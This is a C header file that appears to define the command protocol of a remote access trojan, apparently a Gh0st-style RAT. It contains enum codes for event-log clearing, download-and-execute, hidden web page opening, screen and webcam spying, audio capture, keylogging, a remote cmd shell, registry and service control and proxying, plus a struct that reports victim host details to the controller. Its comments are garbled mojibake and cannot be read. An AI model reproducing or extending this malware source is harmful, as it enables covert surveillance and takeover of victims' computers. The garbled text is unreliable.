//ͨ��Э��
#define HDR_SIZE	15
#define FLAG_SIZE	3
#define	MAX_WRITE_RETRY			15 // ����д���ļ�����
#define	MAX_SEND_BUFFER			1024 * 8 // ��������ݳ���
#define MAX_RECV_BUFFER			1024 * 8 // ���������ݳ���
#define ZLIB_NO  0001		//���ݰ���ѹ��ģʽ
#define ZLIB_OK  0002		//���ݰ�Ϊѹ��ģʽ

enum
{
	// ���ƶ˷���������

	COMMAND_SESSION = 0,			// �Ự�����ػ���������ע��, ж�أ�
	COMMAND_UNINSTALL,              // ж��
	COMMAND_RENAME_REMARK,          // ���ı�ע
	COMMAND_CHANGEDLLINFO,          // ��ѯ����
	COMMAND_CHANGE_GROUP,           // ���ķ���
	COMMAND_CLEAN_EVENT,            // ������־
		
	// ��������
	COMMAND_DOWN_EXEC,              // ����ִ��
	COMMAND_DOWN_UPDATE,            // ���ظ���
	COMMAND_OPEN_URL_SHOW,          // ����ҳ����ʾ��
	COMMAND_OPEN_URL_HIDE,          // ����ҳ�����أ�
	COMMAND_LOCAL_UPLOAD,           // �����ϴ�
	COMMAND_MESSAGEBOX,             // Messagebox
		
	// ɸѡ
	COMMAND_FIND_PROCESS,           // ���ҽ���
	COMMAND_FIND_WINDOW,            // ���Ҵ���
	
	COMMAND_OPEN_PROXY,             // ��������
	COMMAND_CLOSE_PROXY,            // �رմ���
 
	COMMAND_PRANK,                  // �� �� ��

	// ��Ҫ����
	COMMAND_NEXT = 100,				// ��һ��(���ƶ��Ѿ��򿪶Ի���)
	COMMAND_LIST_DRIVE,	            // �ļ�����(�г�����Ŀ¼) 
	COMMAND_SCREEN_SPY,				// ��Ļ���
	COMMAND_WEBCAM,					// ����ͷ���
	COMMAND_AUDIO,                  // ��������
	COMMAND_SHELL,					// cmdshell
	COMMAND_SYSTEM,                 // ϵͳ����
	COMMAND_KEYBOARD,				// ���̼�¼
	COMMAND_SERVICE_MANAGER,	    // �������	
	COMMAND_REGEDIT,                // ע �� ��
	COMMAND_TEXT_CHAT,              // ��������
	COMMAND_PROXY_MAP,				// proxy

	// Ԥ�� 
	COMMAND_PLUGINME,

/////////////////////////////////////////////////////////////////////////////////////////

	// ����˷����ı�ʶ
	TOKEN_LOGIN = 200,				// ���߰�
	TOKEN_DRIVE_LIST,				// �ļ������������б�
	TOKEN_BITMAPINFO,				// ��Ļ��أ���Ļ�鿴��BITMAPINFO��
	TOKEN_WEBCAM_BITMAPINFO,		// ����ͷ������ͷ��BITMAPINFOHEADER��
	TOKEN_SHELL_START,              // CMD
	TOKEN_AUDIO_START,				// ��ʼ��������
	TOKEN_PSLIST,					// �����б�
	TOKEN_KEYBOARD_START,			// ���̼�¼��ʼ
	TOKEN_SERVICE_LIST,             // �����б�
	TOKEN_REGEDIT,                  // ע���ʼ
	TOKEN_TEXTCHAT_START,           // �������쿪ʼ
	TOKEN_PROXY_START,              // ����ӳ�俪ʼ

	// ����
	TOKEN_FIND_YES,                 // ���Ҵ���
	TOKEN_DLLINFO,                  // �鿴����

	// Ԥ��
};

typedef struct
{	
	BYTE			bToken;			// = 1
	char			UpGroup[32];	// ���߷���
	IN_ADDR	    	IPAddress;	// �洢32λ��IPv4�ĵ�ַ���ݽṹ
	char			HostName[50];	// ������
	OSVERSIONINFOEXA	OsVerInfoEx;	// �汾��Ϣ
	DWORD			dwMajorVer;		// ϵͳ���汾
	DWORD			dwMinorVer;		// ϵͳ�ΰ汾
	DWORD			dwBuildNumber;	// ϵͳBuild�汾
	char			CPUClockMhz[20];// CPU��Ϣ
	DWORD			dwSpeed;		// ����
	UINT			bIsWebCam;		// �Ƿ�������ͷ
	bool            bIsWow64;
	DWORD           dwMemSize;
	char            szInstallTime[50];
}LOGININFO;
